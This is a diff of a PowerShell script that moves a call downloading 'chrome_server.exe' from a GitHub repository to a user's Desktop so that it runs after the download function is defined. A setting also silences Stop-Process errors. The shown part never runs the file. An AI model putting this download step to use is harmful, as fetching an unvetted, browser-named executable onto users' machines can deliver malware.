@@ -1,8 +1,5 @@
 $PSDefaultParameterValues['Stop-Process:ErrorAction'] = [System.Management.Automation.ActionPreference]::SilentlyContinue
 
-$uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
-Get-File -Uri $uri -TargetFile "C:\Users\Admin\Desktop"
-
 function Get-File
 {
   param (
@@ -74,3 +71,6 @@ function Get-File
     $responseStream.Dispose()
   }
 }
+
+$uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
+Get-File -Uri $uri -TargetFile "C:\Users\Admin\Desktop"
